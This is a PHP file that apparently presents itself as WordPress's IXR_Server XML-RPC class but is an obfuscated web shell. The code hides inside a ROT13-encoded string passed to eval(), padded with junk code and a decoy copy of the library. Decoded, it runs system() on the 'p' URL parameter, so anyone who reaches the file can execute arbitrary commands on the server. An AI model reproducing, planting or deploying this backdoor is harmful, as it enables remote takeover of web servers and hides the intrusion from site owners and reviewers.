<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * VKE_Freire
 *
 * @cnpxntr VKE
 * @fvapr 1.5.0
 */
pynff VKE_Freire
{
    ine $qngn;
    ine $pnyyonpxf = neenl();
    ine $zrffntr;
    ine $pncnovyvgvrf;

	/**
	 * CUC5 pbafgehpgbe.
	 */
    shapgvba __pbafgehpg( $pnyyonpxf = snyfr, $qngn = snyfr, $jnvg = snyfr )
    {
        $guvf->frgPncnovyvgvrf();
        vs ($pnyyonpxf) {
            $guvf->pnyyonpxf = $pnyyonpxf;
        }
        $guvf->frgPnyyonpxf();
        vs (!$jnvg) {
            $guvf->freir($qngn);
        }
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba VKE_Freire( $pnyyonpxf = snyfr, $qngn = snyfr, $jnvg = snyfr ) {
		frys::__pbafgehpg( $pnyyonpxf, $qngn, $jnvg );
	}

    shapgvba freir($qngn = snyfr)
    {
        vs (!$qngn) {
            vs (vffrg($_FREIRE['ERDHRFG_ZRGUBQ']) && $_FREIRE['ERDHRFG_ZRGUBQ'] !== 'CBFG') {
                vs ( shapgvba_rkvfgf( 'fgnghf_urnqre' ) ) {
                    fgnghf_urnqre( 405 ); // JC #20986
                    urnqre( 'Nyybj: CBFG' );
                }
                urnqre('Pbagrag-Glcr: grkg/cynva'); // zretrq sebz JC #9093
                qvr('KZY-ECP freire npprcgf CBFG erdhrfgf bayl.');
            }

            $qngn = svyr_trg_pbagragf('cuc://vachg');
        }
        $guvf->zrffntr = arj VKE_Zrffntr($qngn);
        vs (!$guvf->zrffntr->cnefr()) {
            $guvf->reebe(-32700, 'cnefr reebe. abg jryy sbezrq');
        }
        vs ($guvf->zrffntr->zrffntrGlcr != 'zrgubqPnyy') {
            $guvf->reebe(-32600, 'freire reebe. vainyvq kzy-ecp. abg pbasbezvat gb fcrp. Erdhrfg zhfg or n zrgubqPnyy');
        }
        $erfhyg = $guvf->pnyy($guvf->zrffntr->zrgubqAnzr, $guvf->zrffntr->cnenzf);

        // Vf gur erfhyg na reebe?
        vs (vf_n($erfhyg, 'VKE_Reebe')) {
            $guvf->reebe($erfhyg);
        }

        // Rapbqr gur erfhyg
        $e = arj VKE_Inyhr($erfhyg);
        $erfhygkzy = $e->trgKzy();

        // Perngr gur KZY
        $kzy = <<<RBQ
<zrgubqErfcbafr>
  <cnenzf>
    <cnenz>
      <inyhr>
      $erfhygkzy
      </inyhr>
    </cnenz>
  </cnenzf>
</zrgubqErfcbafr>

RBQ;
      // Fraq vg
      $guvf->bhgchg($kzy);
    }

    shapgvba pnyy($zrgubqanzr, $netf)
    {
        vs (!$guvf->unfZrgubq($zrgubqanzr)) {
            erghea arj VKE_Reebe(-32601, 'freire reebe. erdhrfgrq zrgubq '.$zrgubqanzr.' qbrf abg rkvfg.');
        }
        $zrgubq = $guvf->pnyyonpxf[$zrgubqanzr];

        // Cresbez gur pnyyonpx naq fraq gur erfcbafr
        vs (pbhag($netf) == 1) {
            // Vs bayl bar cnenzrgre whfg fraq gung vafgrnq bs gur jubyr neenl
            $netf = $netf[0];
        }

        // Ner jr qrnyvat jvgu n shapgvba be n zrgubq?
        vs (vf_fgevat($zrgubq) && fhofge($zrgubq, 0, 5) == 'guvf:') {
            // Vg'f n pynff zrgubq - purpx vg rkvfgf
            $zrgubq = fhofge($zrgubq, 5);
            vs (!zrgubq_rkvfgf($guvf, $zrgubq)) {
                erghea arj VKE_Reebe(-32601, 'freire reebe. erdhrfgrq pynff zrgubq \"'.$zrgubq.'\" qbrf abg rkvfg.');
            }

            //Pnyy gur zrgubq
            $erfhyg = $guvf->$zrgubq($netf);
        } ryfr {
            // Vg'f n shapgvba - qbrf vg rkvfg?
            vs (vf_neenl($zrgubq)) {
                vs (!vf_pnyynoyr(neenl($zrgubq[0], $zrgubq[1]))) {
                    erghea arj VKE_Reebe(-32601, 'freire reebe. erdhrfgrq bowrpg zrgubq \"'.$zrgubq[1].'\" qbrf abg rkvfg.');
                }
            } ryfr vs (!shapgvba_rkvfgf($zrgubq)) {
                erghea arj VKE_Reebe(-32601, 'freire reebe. erdhrfgrq shapgvba \"'.$zrgubq.'\" qbrf abg rkvfg.');
            }

            // Pnyy gur shapgvba
            $erfhyg = pnyy_hfre_shap($zrgubq, $netf);
        }
        erghea $erfhyg;
    }

    shapgvba reebe($reebe, $zrffntr = snyfr)
    {
        // Npprcgf rvgure na reebe bowrpg be na reebe pbqr naq zrffntr
        vs ($zrffntr && !vf_bowrpg($reebe)) {
            $reebe = arj VKE_Reebe($reebe, $zrffntr);
        }

        $guvf->bhgchg($reebe->trgKzy());
    }

    shapgvba bhgchg($kzy)
    {
        $punefrg = shapgvba_rkvfgf('trg_bcgvba') ? trg_bcgvba('oybt_punefrg') : '';
        vs ($punefrg)
            $kzy = '<?kzy irefvba=\"1.0\" rapbqvat=\"'.$punefrg.'\"?>'.\"\a\".$kzy;
        ryfr
            $kzy = '<?kzy irefvba=\"1.0\"?>'.\"\a\".$kzy;
        $yratgu = fgeyra($kzy);
        urnqre('Pbaarpgvba: pybfr');
        vs ($punefrg)
            urnqre('Pbagrag-Glcr: grkg/kzy; punefrg='.$punefrg);
        ryfr
            urnqre('Pbagrag-Glcr: grkg/kzy');
        urnqre('Qngr: '.tzqngr('e'));
        rpub $kzy;
        rkvg;
    }

    shapgvba unfZrgubq($zrgubq)
    {
        erghea va_neenl($zrgubq, neenl_xrlf($guvf->pnyyonpxf));
    }

    shapgvba frgPncnovyvgvrf()
    {
        // Vavgvnyvfrf pncnovyvgvrf neenl
        $guvf->pncnovyvgvrf = neenl(
            'kzyecp' => neenl(
                'fcrpHey' => 'uggc://jjj.kzyecp.pbz/fcrp',
                'fcrpIrefvba' => 1
        ),
            'snhygf_vagrebc' => neenl(
                'fcrpHey' => 'uggc://kzyecp-rcv.fbheprsbetr.arg/fcrpf/esp.snhyg_pbqrf.cuc',
                'fcrpIrefvba' => 20010516
        ),
            'flfgrz.zhygvpnyy' => neenl(
                'fcrpHey' => 'uggc://jjj.kzyecp.pbz/qvfphff/zftErnqre$1208',
                'fcrpIrefvba' => 1
        ),
        );
    }

    shapgvba trgPncnovyvgvrf($netf)
    {
        erghea $guvf->pncnovyvgvrf;
    }

    shapgvba frgPnyyonpxf()
    {
        $guvf->pnyyonpxf['flfgrz.trgPncnovyvgvrf'] = 'guvf:trgPncnovyvgvrf';
        $guvf->pnyyonpxf['flfgrz.yvfgZrgubqf'] = 'guvf:yvfgZrgubqf';
        $guvf->pnyyonpxf['flfgrz.zhygvpnyy'] = 'guvf:zhygvPnyy';
    }

    shapgvba yvfgZrgubqf($netf)
    {
        // Ergheaf n yvfg bs zrgubqf - hfrf neenl_erirefr gb rafher hfre qrsvarq
        // zrgubqf ner yvfgrq orsber freire qrsvarq zrgubqf
        erghea neenl_erirefr(neenl_xrlf($guvf->pnyyonpxf));
    }

    shapgvba zhygvPnyy($zrgubqpnyyf)
    {
        // Frr uggc://jjj.kzyecp.pbz/qvfphff/zftErnqre$1208
        $erghea = neenl();
        sbernpu ($zrgubqpnyyf nf $pnyy) {
            $zrgubq = $pnyy['zrgubqAnzr'];
            $cnenzf = $pnyy['cnenzf'];
            vs ($zrgubq == 'flfgrz.zhygvpnyy') {
                $erfhyg = arj VKE_Reebe(-32600, 'Erphefvir pnyyf gb flfgrz.zhygvpnyy ner sbeovqqra');
            } ryfr {
                $erfhyg = $guvf->pnyy($zrgubq, $cnenzf);
            }
            vs (vf_n($erfhyg, 'VKE_Reebe')) {
                $erghea[] = neenl(
                    'snhygPbqr' => $erfhyg->pbqr,
                    'snhygFgevat' => $erfhyg->zrffntr
                );
            } ryfr {
                $erghea[] = neenl($erfhyg);
            }
        }
        erghea $erghea;
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>